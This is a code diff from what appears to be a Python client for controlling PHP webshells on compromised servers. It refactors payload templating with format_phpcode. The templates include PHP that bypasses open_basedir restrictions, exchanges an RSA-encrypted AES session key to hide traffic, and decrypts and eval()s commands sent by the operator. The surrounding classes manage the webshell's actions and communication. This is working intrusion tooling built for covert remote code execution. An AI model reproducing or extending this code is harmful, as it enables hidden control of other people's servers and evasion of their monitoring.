@@ -555,23 +555,25 @@ function bypass_open_basedir()
     }
 }
 bypass_open_basedir();
-PAYLOAD
+{payload}
 """
 )
 
 ENCRYPTION_SENDKEY_PHP = compress_phpcode_template(
     """
-if(extension_loaded('openssl')) {
-    $_SESSION[SESSION_NAME] = openssl_random_pseudo_bytes(32);
+if(!extension_loaded('openssl')){
+    decoder_echo("WRONG_NO_OPENSSL");
+}else if(!function_exists("openssl_public_encrypt")){
+    decoder_echo("WRONG_NO_OPENSSL_FUNCTION");
+}else{
+    $_SESSION[{session_name}] = openssl_random_pseudo_bytes(32);
     openssl_public_encrypt(
-        $_SESSION[SESSION_NAME],
+        $_SESSION[{session_name}],
         $encrypted,
-        base64_decode(PUBKEY_B64),
+        base64_decode({pubkey_b64}),
         OPENSSL_PKCS1_OAEP_PADDING
     );
     decoder_echo(base64_encode($encrypted));
-}else{
-    decoder_echo("WRONG_NO_OPENSSL");
 }
 """
 )
@@ -583,7 +585,7 @@ function aes_enc($data) {
     $encryptedData = openssl_encrypt(
         $data,
         'AES-256-CBC',
-        $_SESSION[SESSION_NAME],
+        $_SESSION[{session_name}],
         0,
         $iv
     );
@@ -595,17 +597,17 @@ function aes_dec($encryptedData) {
     return openssl_decrypt(
         base64_encode(substr($data, 16)),
         'AES-256-CBC',
-        $_SESSION[SESSION_NAME],
+        $_SESSION[{session_name}],
         0,
         substr($data, 0, 16)
     );
-    unset($_SESSION[SESSION_NAME]);
+    unset($_SESSION[{session_name}]);
 }
-if(!isset($_SESSION[SESSION_NAME])){
+if(!isset($_SESSION[{session_name}])){
     decoder_echo("WRONG_NO_SESSION");
 }else if(extension_loaded('openssl')) {
     array_push($decoder_hooks, "aes_enc");
-    $code = aes_dec(CODE_ENC);
+    $code = aes_dec({code_enc});
     eval($code);
 }else{
     decoder_echo("WRONG_NO_OPENSSL");
@@ -678,13 +680,16 @@ def to_sessionize_payload(
 async def get_aes_key(pubkey, submitter):
     session_name = f"_{uuid.uuid4()}"  # PHP有时不支持数字session key
     key_encrypted = await submitter(
-        ENCRYPTION_SENDKEY_PHP.replace("PUBKEY_B64", string_repr(base64_encode(pubkey)))
-        .replace("SESSION_NAME", string_repr(session_name))
-        .replace("    ", "")
-        .strip()
+        format_phpcode(
+            ENCRYPTION_SENDKEY_PHP,
+            session_name=string_repr(session_name),
+            pubkey_b64=string_repr(base64_encode(pubkey)),
+        )
     )
     if key_encrypted == "WRONG_NO_OPENSSL":
         raise exceptions.TargetRuntimeError("目标不支持OpenSSL扩展！")
+    if key_encrypted == "WRONG_NO_OPENSSL_FUNCTION":
+        raise exceptions.TargetRuntimeError("目标不支持openssl_public_encrypt函数！")
     try:
         key = private_decrypt_rsa(key_encrypted)
     except Exception as exc:
@@ -1123,6 +1128,7 @@ class PHPWebshellActions(PHPSessionInterface):
             for entry in raw_result
         ]
         return result
+
     async def download_phpinfo(self) -> bytes:
         """获取当前的phpinfo文件"""
         b64_result = await self.submit(DOWNLOAD_PHPINFO_PHP)
@@ -1260,7 +1266,10 @@ class PHPWebshellCommunication(PHPWebshellActions):
     def bypass_opendir_wrapper(self, submitter: Submitter) -> Submitter:
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
-            return await submitter(BYPASS_OPEN_BASEDIR_PHP.replace("PAYLOAD", payload))
+            return await submitter(format_phpcode(
+                BYPASS_OPEN_BASEDIR_PHP,
+                payload=payload
+            ))
 
         return wrap
 
@@ -1276,9 +1285,11 @@ class PHPWebshellCommunication(PHPWebshellActions):
             payload_enc = encrypt_aes256_cbc(self.aes_key, payload.encode("utf-8"))
 
             result_enc = await submitter(
-                ENCRYPTION_COMMUNICATE_PHP.replace(
-                    "SESSION_NAME", string_repr(self.aes_session_name)
-                ).replace("CODE_ENC", string_repr(base64_encode(payload_enc)))
+                format_phpcode(
+                    ENCRYPTION_COMMUNICATE_PHP,
+                    session_name = string_repr(self.aes_session_name),
+                    code_enc = string_repr(base64_encode(payload_enc))
+                )
             )
             if result_enc == "WRONG_NO_SESSION":
                 self.aes_key = None
